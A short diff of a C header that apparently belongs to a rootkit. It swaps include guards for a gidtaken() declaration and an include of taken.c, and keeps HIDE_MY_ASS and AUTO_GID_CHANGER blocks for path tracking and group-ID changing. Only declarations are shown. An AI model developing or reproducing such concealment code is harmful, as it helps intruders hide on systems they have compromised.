@@ -1,5 +1,5 @@
-#ifndef _GID_H_
-#define _GID_H_
+int gidtaken(gid_t newgid);
+#include "taken.c"
 
 #ifdef HIDE_MY_ASS
 int pathtracked(const char *pathname);
@@ -23,6 +23,4 @@ gid_t readgid(void);
 #ifdef AUTO_GID_CHANGER
 void gidchanger(void);
 #include "auto.c"
-#endif
-
 #endif
